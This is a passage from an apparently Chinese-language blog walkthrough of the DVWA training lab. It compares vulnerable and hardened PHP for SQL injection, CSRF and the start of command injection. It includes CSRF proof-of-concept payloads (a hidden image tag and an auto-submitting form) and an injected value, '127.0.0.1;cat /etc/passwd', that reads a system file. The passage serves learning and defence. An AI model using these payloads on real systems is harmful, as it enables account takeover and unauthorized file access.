</span><br><span class="line">        <span class="comment">// Get values </span></span><br><span class="line">        $first = mysql_result( $result, $i, <span class="string">"first_name"</span> ); </span><br><span class="line">        $last  = mysql_result( $result, $i, <span class="string">"last_name"</span> ); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"</span>; </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Increase loop count </span></span><br><span class="line">        $i++; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ul><p>在高级版本中只是把注入点隐匿在了<code>$_SESSION</code>全局变量里面,而session中的id值的注册是通过用户输入$_POST全局变量传入，所以是完全可控的，这样一来，就和之前的注入没有什么不一样。这段代码是要提醒我们对于session，只要注册值是用户可控的，也是可能存在sql注入的风险的。另外需要注意到的是，在这个High级别的注入中，回显和传参页面不是同一个，是一个二阶注入，如果使用工具注入，如sqlmap，别忘了加上自定义回显<code>--second-order</code>参数。</p><ul><li>Impossible level<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Submit'</span> ] ) ) &#123; </span><br><span class="line">    <span class="comment">// Check Anti-CSRF token </span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    $id = $_GET[ <span class="string">'id'</span> ]; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Was a number entered? </span></span><br><span class="line">    <span class="keyword">if</span>(is_numeric( $id )) &#123; </span><br><span class="line">        <span class="comment">// Check the database </span></span><br><span class="line">        $data = $db-&gt;prepare( <span class="string">'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;'</span> ); </span><br><span class="line">        $data-&gt;bindParam( <span class="string">':id'</span>, $id, PDO::PARAM_INT ); </span><br><span class="line">        $data-&gt;execute(); </span><br><span class="line">        $row = $data-&gt;fetch(); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Make sure only 1 result is returned </span></span><br><span class="line">        <span class="keyword">if</span>( $data-&gt;rowCount() == <span class="number">1</span> ) &#123; </span><br><span class="line">            <span class="comment">// Get values </span></span><br><span class="line">            $first = $row[ <span class="string">'first_name'</span> ]; </span><br><span class="line">            $last  = $row[ <span class="string">'last_name'</span> ]; </span><br><span class="line"></span><br><span class="line">            <span class="comment">// Feedback for end user </span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token </span></span><br><span class="line">generateSessionToken(); </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ul><p>根据DVWA的说法，这样写出来的应用，是不存在sql注入的。也即这是个十分安全的php代码编写规范。why?首先，我们可以看到它使用Anti-CSRF token的方法来避免csrf攻击（具体细节会在下文csrf防御谈到），然后在sql语句的编写中，使用的是预处理语句，所谓的预处理就是通过php的pdo预处理机制<code>PDO::prepare</code>，先往数据库送出语句模板，进行解析,编译，然后第二次向数据库传入查询参数，在第二次的查询过程中可以理解为不再进行语义解析，所以即使传入sql语句，也会因为不进行语义解析而失效。所以这是一种比较推荐的数据库交互sql语句编写规范。现在很多主流的数据库已经支持预处理，即使不支持，PHP的PDO也会进行预处理模拟实现，这样对于程序员接口一致，不需了解不同数据库对预处理支持的方式差异。  </p><p><br><br>更多PDO细节可以参考官网：<a href="http://php.net/manual/zh/pdo.prepared-statements.php。" target="_blank" rel="noopener">http://php.net/manual/zh/pdo.prepared-statements.php。</a>  <br><br><br><br>参数bind的细节可以查看：<a href="http://php.net/manual/zh/pdo.constants.php。" target="_blank" rel="noopener">http://php.net/manual/zh/pdo.constants.php。</a><br></p><h3 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h3><p>(完整的攻击过程，可以看这篇前辈的文章：<a href="http://www.freebuf.com/articles/web/118352.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/118352.html</a>)</p><ul><li>Low level</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Change'</span> ] ) ) &#123; </span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    $pass_new  = $_GET[ <span class="string">'password_new'</span> ]; </span><br><span class="line">    $pass_conf = $_GET[ <span class="string">'password_conf'</span> ]; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Do the passwords match? </span></span><br><span class="line">    <span class="keyword">if</span>( $pass_new == $pass_conf ) &#123; </span><br><span class="line">        <span class="comment">// They do! </span></span><br><span class="line">        $pass_new = mysql_real_escape_string( $pass_new ); </span><br><span class="line">        $pass_new = md5( $pass_new ); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update the database </span></span><br><span class="line">        $insert = <span class="string">"UPDATE `users` SET password = '$pass_new' WHERE user = '"</span> . dvwaCurrentUser() . <span class="string">"';"</span>; </span><br><span class="line">        $result = mysql_query( $insert ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> ); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the user </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="comment">// Issue with passwords matching </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"</span>; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>所谓的CSRF（Cross-site request forgery）直白的翻译就是跨站点请求伪造。说人话就是攻击者通过诱使victim访问其精心构造的url或者访问其精心构造的页面，来使得攻击者可以以victim的身份做诸如发邮件，发消息，改密码等骚操作。在DVWA这个系列里面，模拟的是修改密码的界面。先来看下low等级的代码，可以说是没有进行仍和的再认证，试下为啥是“再认证”？其实我们在访问到这个修改密码界面的时候，已经登陆过一次，服务器会在每次访问时检查session。所以这是第一道认证。但是这种会话级别的认证对csrf是没有抵抗力的。具体的过程可以参看之前提到的链接。我们可以直接构造url<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/dvwa/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change#</span><br></pre></td></tr></table></figure></p><p>让victim访问，或者使用更加隐匿的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;style&gt;</span><br><span class="line">   form&#123;</span><br><span class="line">    display:none;</span><br><span class="line">   &#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><p>构造无迹表单,结合js发送请求，或者<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;http://192.168.153.130/dvwa/vulnerabilities/csrf/?password_new=hack&amp;password_conf=hack&amp;Change=Change#&quot; border=&quot;0&quot; style=&quot;display:none;&quot;/&gt;</span><br></pre></td></tr></table></figure></p><p>来实现欺骗隐匿行踪，达到修改密码的目的。顺便盗用两个别人的poc方便展示：</p><p>(1) 图片形式诱导<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;http://192.168.153.130/dvwa/vulnerabilities/csrf/?password_new=hack&amp;password_conf=hack&amp;Change=Change#&quot; border=&quot;0&quot; style=&quot;display:none;&quot;/&gt;</span><br><span class="line"></span><br><span class="line">&lt;h1&gt;404&lt;h1&gt;</span><br><span class="line"></span><br><span class="line">&lt;h2&gt;file not found.&lt;h2&gt;</span><br></pre></td></tr></table></figure></p><p>(2) 隐藏表单的形式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">  &lt;body onload=&quot;javascript:csrf()&quot;&gt;</span><br><span class="line">   &lt;script&gt;</span><br><span class="line">   function csrf()&#123;</span><br><span class="line">    document.getElementById(&quot;button&quot;).click();</span><br><span class="line">   &#125;</span><br><span class="line">   &lt;/script&gt;</span><br><span class="line">   &lt;style&gt;</span><br><span class="line">   form&#123;</span><br><span class="line">    display:none;</span><br><span class="line">   &#125;</span><br><span class="line">   &lt;/style&gt;</span><br><span class="line">        &lt;form action=&quot;http://www.dvwa.com/vulnerabilities/csrf/?&quot; method=&quot;GET&quot;&gt;</span><br><span class="line">            New password:&lt;br /&gt;</span><br><span class="line">            &lt;input type=&quot;password&quot; AUTOCOMPLETE=&quot;off&quot; name=&quot;password_new&quot; value=&quot;test&quot;&gt;&lt;br /&gt;</span><br><span class="line">            Confirm new password:&lt;br /&gt;</span><br><span class="line">            &lt;input type=&quot;password&quot; AUTOCOMPLETE=&quot;off&quot; name=&quot;password_conf&quot; value=&quot;test&quot;&gt;&lt;br /&gt;</span><br><span class="line">            &lt;br /&gt;</span><br><span class="line">            &lt;input type=&quot;submit&quot; id=&quot;button&quot; name=&quot;Change&quot; value=&quot;Change&quot; /&gt;</span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure><ul><li>Medium level<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Change'</span> ] ) ) &#123; </span><br><span class="line">    <span class="comment">// Checks to see where the request came from </span></span><br><span class="line">    <span class="keyword">if</span>( eregi( $_SERVER[ <span class="string">'SERVER_NAME'</span> ], $_SERVER[ <span class="string">'HTTP_REFERER'</span> ] ) ) &#123; </span><br><span class="line">        <span class="comment">// Get input </span></span><br><span class="line">        $pass_new  = $_GET[ <span class="string">'password_new'</span> ]; </span><br><span class="line">        $pass_conf = $_GET[ <span class="string">'password_conf'</span> ]; </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Do the passwords match? </span></span><br><span class="line">        <span class="keyword">if</span>( $pass_new == $pass_conf ) &#123; </span><br><span class="line">            <span class="comment">// They do! </span></span><br><span class="line">            $pass_new = mysql_real_escape_string( $pass_new ); </span><br><span class="line">            $pass_new = md5( $pass_new ); </span><br><span class="line"></span><br><span class="line">            <span class="comment">// Update the database </span></span><br><span class="line">            $insert = <span class="string">"UPDATE `users` SET password = '$pass_new' WHERE user = '"</span> . dvwaCurrentUser() . <span class="string">"';"</span>; </span><br><span class="line">            $result = mysql_query( $insert ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> ); </span><br><span class="line"></span><br><span class="line">            <span class="comment">// Feedback for the user </span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="comment">// Issue with passwords matching </span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="comment">// Didn't come from a trusted source </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;That request didn't look correct.&lt;/pre&gt;"</span>; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ul><p>在这个级别的CSRF漏洞中，服务端多了一句<code>eregi( $_SERVER[ &#39;SERVER_NAME&#39; ], $_SERVER[ &#39;HTTP_REFERER&#39; ]</code>校验，<code>ereg()</code>函数是模式匹配，通过超全局数组获取了请求头referer值（也就是访问者向host发起请求时所在的页面）和host值，并且检查host的值是否在referer中出现。根据权威(<a href="https://developer.mozilla.org/en-US/docs/Glossary/Forbidden_header_name)，这两个值无法以编程的方式修改，抓包除外，因为在csrf中无法通过抓取客户端的包进行修改，所以按理来说是安全的。实则不然，通过公网服务器，诱使victim访问名字包含host的html文件就可以实现绕过。" target="_blank" rel="noopener">https://developer.mozilla.org/en-US/docs/Glossary/Forbidden_header_name)，这两个值无法以编程的方式修改，抓包除外，因为在csrf中无法通过抓取客户端的包进行修改，所以按理来说是安全的。实则不然，通过公网服务器，诱使victim访问名字包含host的html文件就可以实现绕过。</a></p><ul><li>High level<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Change'</span> ] ) ) &#123; </span><br><span class="line">    <span class="comment">// Check Anti-CSRF token </span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    $pass_new  = $_GET[ <span class="string">'password_new'</span> ]; </span><br><span class="line">    $pass_conf = $_GET[ <span class="string">'password_conf'</span> ]; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Do the passwords match? </span></span><br><span class="line">    <span class="keyword">if</span>( $pass_new == $pass_conf ) &#123; </span><br><span class="line">        <span class="comment">// They do! </span></span><br><span class="line">        $pass_new = mysql_real_escape_string( $pass_new ); </span><br><span class="line">        $pass_new = md5( $pass_new ); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update the database </span></span><br><span class="line">        $insert = <span class="string">"UPDATE `users` SET password = '$pass_new' WHERE user = '"</span> . dvwaCurrentUser() . <span class="string">"';"</span>; </span><br><span class="line">        $result = mysql_query( $insert ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> ); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the user </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="comment">// Issue with passwords matching </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"</span>; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token </span></span><br><span class="line">generateSessionToken(); </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ul><p>在高级别中的代码，主要是使用了Anti-csrf机制，用户每次访问改密页面时，服务器会返回一个随机的token，向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会优先检查token，只有token正确，才会处理客户端的请求。我们可以按F12来看看这个token:<br><img src="/myimages/php/1.jpg" alt="image"></p><p>可以看到不同的用户会返回一个不同的token，这个token在hidden栏里面,这样一来，迫于同源策略，攻击者无法获取victim的token，也就无法实现CSRF攻击。但是真的无法实现吗？配合xss我们还是可以盗取token的，但是这难度无疑增大，我们必须要有服务器的一个xss漏洞来盗取token，然后再使用CSRF。攻击成本也增大。</p><ul><li>Impossible level<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Change'</span> ] ) ) &#123; </span><br><span class="line">    <span class="comment">// Check Anti-CSRF token </span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    $pass_curr = $_GET[ <span class="string">'password_current'</span> ]; </span><br><span class="line">    $pass_new  = $_GET[ <span class="string">'password_new'</span> ]; </span><br><span class="line">    $pass_conf = $_GET[ <span class="string">'password_conf'</span> ]; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise current password input </span></span><br><span class="line">    $pass_curr = stripslashes( $pass_curr ); </span><br><span class="line">    $pass_curr = mysql_real_escape_string( $pass_curr ); </span><br><span class="line">    $pass_curr = md5( $pass_curr ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check that the current password is correct </span></span><br><span class="line">    $data = $db-&gt;prepare( <span class="string">'SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;'</span> ); </span><br><span class="line">    $data-&gt;bindParam( <span class="string">':user'</span>, dvwaCurrentUser(), PDO::PARAM_STR ); </span><br><span class="line">    $data-&gt;bindParam( <span class="string">':password'</span>, $pass_curr, PDO::PARAM_STR ); </span><br><span class="line">    $data-&gt;execute(); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Do both new passwords match and does the current password match the user? </span></span><br><span class="line">    <span class="keyword">if</span>( ( $pass_new == $pass_conf ) &amp;&amp; ( $data-&gt;rowCount() == <span class="number">1</span> ) ) &#123; </span><br><span class="line">        <span class="comment">// It does! </span></span><br><span class="line">        $pass_new = stripslashes( $pass_new ); </span><br><span class="line">        $pass_new = mysql_real_escape_string( $pass_new ); </span><br><span class="line">        $pass_new = md5( $pass_new ); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update database with new password </span></span><br><span class="line">        $data = $db-&gt;prepare( <span class="string">'UPDATE users SET password = (:password) WHERE user = (:user);'</span> ); </span><br><span class="line">        $data-&gt;bindParam( <span class="string">':password'</span>, $pass_new, PDO::PARAM_STR ); </span><br><span class="line">        $data-&gt;bindParam( <span class="string">':user'</span>, dvwaCurrentUser(), PDO::PARAM_STR ); </span><br><span class="line">        $data-&gt;execute(); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the user </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="comment">// Issue with passwords matching </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Passwords did not match or current password incorrect.&lt;/pre&gt;"</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token </span></span><br><span class="line">generateSessionToken(); </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ul><p>在high的基础上，直接进行了密码再认证，这样一来，即使盗取了token，没有原始密码，也无法进行修改密码的操作，这样CSRF就可以完全避免了。所以通过这个CSRF系列，我们可以知晓，在csrf防御中，采用关键操作的原子性认证，是避免这一漏洞攻击的不二办法。其实我们只关注了CSRF部分，在之前的level中，也还存在了sql注入，在这个impossible版本里，还使用了之前提到的预操纵来进行数据库交互，降低了sql注入的风险。</p><h3 id="Command-Injection"><a href="#Command-Injection" class="headerlink" title="Command Injection"></a>Command Injection</h3><ul><li>Low level<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Submit'</span> ]  ) ) &#123; </span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    $target = $_REQUEST[ <span class="string">'ip'</span> ]; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Determine OS and execute the ping command. </span></span><br><span class="line">    <span class="keyword">if</span>( stristr( php_uname( <span class="string">'s'</span> ), <span class="string">'Windows NT'</span> ) ) &#123; </span><br><span class="line">        <span class="comment">// Windows </span></span><br><span class="line">        $cmd = shell_exec( <span class="string">'ping  '</span> . $target ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="comment">// *nix </span></span><br><span class="line">        $cmd = shell_exec( <span class="string">'ping  -c 4 '</span> . $target ); </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for the end user </span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;"</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ul><p>过分相信用户的输入，直接拼接到ping 命令中，会造成命令注入。注意到常用的bash命令拼接的方式有<code>||</code>.<code>&amp;&amp;</code>,<code>|</code>,<code>&amp;</code>,<code>;</code>这五个，所以由于没有过滤完全，我们直接进行命令拼接，然后执行任意命令，如<code>127.0.0.1;cat /etc/passwd</code>。</p><ul><li>Medium level<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Submit'</span> ]  ) ) &#123; </span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    $target = $_REQUEST[ <span class="string">'ip'</span> ]; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set blacklist </span></span><br><span class="line">    $substitutions = <span class="keyword">array</span>( </span><br><span class="line">        <span class="string">'&amp;&amp;'</span> =&gt; <span class="string">''</span>, </span><br><span class="line">        <span class="string">';'</span>  =&gt; <span class="string">''</span>, </span><br><span class="line">    ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Remove any of the charactars in the array (blacklist). </span></span><br><span class="line">    $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Determine OS and execute the ping command. </span></span><br><span class="line">    <span class="keyword">if</span>( stristr( php_uname( <span class="string">'s'</span> ), <span class="string">'Windows NT'</span> ) ) &#123; </span><br><span class="line">        <span class="comment">// Windows </span></span><br><span class="line">        $cmd = shell_exec( <span class="string">'ping  '</span> . $target ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="comment">// *nix </span></span><br><span class="line">        $cmd = shell_exec( <span class="string">'ping  -c 4 '</span> . $target ); </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for the end user </span></span><br><span class="line">    <span class="keyword">echo</span> <span 